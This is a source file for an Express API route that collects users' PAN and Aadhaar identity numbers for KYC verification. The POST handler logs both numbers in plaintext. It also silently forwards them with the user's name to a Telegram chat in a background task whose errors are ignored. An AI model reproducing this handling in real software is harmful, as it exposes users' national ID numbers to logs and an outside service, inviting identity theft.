import { Router } from "express";
import { db } from "@workspace/db";
import { kycDocumentsTable, usersTable } from "@workspace/db/schema";
import { eq } from "drizzle-orm";
import { requireAuth, type AuthRequest } from "../middlewares/authMiddleware.js";
import { sendTelegram } from "../lib/telegram.js";

const router = Router();

router.get("/", requireAuth, async (req: AuthRequest, res) => {
  try {
    const [user] = await db.select({ kycStatus: usersTable.kycStatus }).from(usersTable).where(eq(usersTable.id, req.user!.id)).limit(1);
    const [doc] = await db.select().from(kycDocumentsTable).where(eq(kycDocumentsTable.userId, req.user!.id)).limit(1);

    if (!doc && (!user || user.kycStatus === 'pending')) { res.json(null); return; }

    // usersTable.kycStatus is always authoritative (admin can override directly)
    const effectiveStatus = user?.kycStatus || doc?.status || 'pending';

    res.json({
      id: doc?.id ?? null,
      userId: req.user!.id,
      panNumber: doc?.panNumber ?? null,
      aadharNumber: doc?.aadharNumber ?? null,
      status: effectiveStatus,
      rejectionReason: doc?.rejectionReason ?? null,
      submittedAt: doc?.submittedAt?.toISOString() ?? null,
      reviewedAt: doc?.reviewedAt?.toISOString() ?? null,
    });
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

router.post("/", requireAuth, async (req: AuthRequest, res) => {
  try {
    const { panNumber, aadharNumber } = req.body;

    if (!panNumber || !aadharNumber) {
      res.status(400).json({ message: "PAN number and Aadhaar number are required" });
      return;
    }

    const pan = String(panNumber).toUpperCase().trim();
    const aadhar = String(aadharNumber).replace(/\s/g, '').trim();

    console.log(`[KYC] User ${req.user!.id} submitting — PAN: ${pan}, Aadhaar: ${aadhar}`);

    const existing = await db.select().from(kycDocumentsTable).where(eq(kycDocumentsTable.userId, req.user!.id)).limit(1);
    let doc;
    if (existing.length > 0) {
      [doc] = await db.update(kycDocumentsTable)
        .set({
          panNumber: pan,
          aadharNumber: aadhar,
          status: "submitted",
          submittedAt: new Date(),
          rejectionReason: null,
          reviewedAt: null,
        })
        .where(eq(kycDocumentsTable.userId, req.user!.id)).returning();
    } else {
      [doc] = await db.insert(kycDocumentsTable).values({
        userId: req.user!.id,
        panNumber: pan,
        aadharNumber: aadhar,
        status: "submitted",
      }).returning();
    }

    await db.update(usersTable).set({ kycStatus: "submitted" }).where(eq(usersTable.id, req.user!.id));
    console.log(`[KYC] Saved — docId: ${doc.id}, userId: ${req.user!.id}`);

    const userId = req.user!.id;
    const userEmail = req.user!.email;
    void (async () => {
      try {
        const [user] = await db
          .select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
          .from(usersTable)
          .where(eq(usersTable.id, userId))
          .limit(1);
        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
        await sendTelegram([
          `📄 <b>KYC SUBMITTED</b>`,
          `👤 User: ${name}`,
          `💳 PAN: ${pan}`,
          `🆔 Aadhaar: ${aadhar}`,
        ].join("\n"));
      } catch { /* silent */ }
    })();

    res.json({
      id: doc.id,
      userId: doc.userId,
      panNumber: doc.panNumber,
      aadharNumber: doc.aadharNumber,
      status: doc.status,
      submittedAt: doc.submittedAt?.toISOString(),
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Internal server error" });
  }
});

export default router;
